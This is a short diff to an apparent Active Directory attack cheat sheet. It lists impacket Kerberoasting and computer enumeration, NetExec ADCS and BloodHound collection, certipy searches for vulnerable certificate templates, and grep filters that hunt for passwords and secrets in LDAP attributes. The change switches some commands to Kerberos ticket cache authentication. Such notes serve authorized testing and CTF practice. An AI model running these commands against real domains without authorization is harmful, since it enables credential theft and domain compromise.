@@ -183,8 +183,8 @@ impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/--
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -k -M adcs
-nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
+nxc ldap $TARGET --dns-server $TARGET --use-kcache -M adcs
+nxc ldap $TARGET --dns-server $TARGET --use-kcache --bloodhound -c all
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
 windapsearch --dc-ip $TARGET -u $USERNAME -p $PASSWORD --full --users --computers | grep -Evi 'bad|LastSet' | grep -Ei 'passw|pwd|key|secret|desc'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
